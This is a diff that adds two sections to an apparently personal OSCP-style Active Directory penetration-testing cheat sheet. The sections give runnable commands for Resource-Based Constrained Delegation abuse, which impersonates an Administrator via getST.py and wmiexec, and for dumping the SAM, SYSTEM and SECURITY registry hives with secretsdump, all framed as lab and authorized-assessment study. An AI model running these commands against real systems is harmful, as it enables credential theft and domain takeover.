@@ -499,6 +499,50 @@ runas /netonly /user:DOMAIN\user "cmd.exe"
 
 ---
 
+## Resource-Based Constrained Delegation
+
+RBCD stores a security descriptor on the target computer. It allows a controlled service account to request delegated service tickets to that target. Confirm a writable computer-object ACL before changing the directory.
+
+```bash
+# Collect the object relationships from Kali
+bloodhound-python -u $Username -p $Password -d $Domain -ns $BoxIP -c All --zip -op $BoxDir/loot/
+
+# Add and later remove the controlled machine account from the target computer's RBCD list
+bloodyAD -u $Username -p $Password -d $Domain --host $BoxIP add rbcd $TargetComputer $MachineAccount
+bloodyAD -u $Username -p $Password -d $Domain --host $BoxIP remove rbcd $TargetComputer $MachineAccount
+
+# Request an Administrator CIFS ticket with the controlled machine hash
+getST.py -spn "cifs/$FQDN" -impersonate $AdminUser -dc-ip $BoxIP \
+  "$Domain/$MachineAccount" -hashes ":$NThash"
+
+# Use the ccache against the target service
+KRB5CCNAME=$BoxDir/loot/Administrator.ccache wmiexec.py -k -no-pass $FQDN
+```
+
+`$TargetComputer` is the computer receiving the RBCD setting. `$MachineAccount` is the account that performs S4U2Self and S4U2Proxy. Preserve the trailing `$` in computer account names. Resolve `$FQDN` before using Kerberos clients.
+
+---
+
+## Local registry hive extraction
+
+```cmd
+reg save HKLM\SAM C:\Temp\SAM /y
+reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
+reg save HKLM\SECURITY C:\Temp\SECURITY /y
+```
+
+```bash
+secretsdump.py \
+  -sam $BoxDir/loot/SAM \
+  -system $BoxDir/loot/SYSTEM \
+  -security $BoxDir/loot/SECURITY \
+  LOCAL
+```
+
+`SYSTEM` supplies the boot key, `SAM` provides local account hashes, and `SECURITY` provides LSA secrets such as the machine-account secret. Keep the output private and remove the target copies after analysis.
+
+---
+
 ## Privileged Access
 
 ```powershell
@@ -939,3 +983,4 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- demonstrates anonymous LDAP, registry-hive extraction, RBCD, and ccache-based WMI
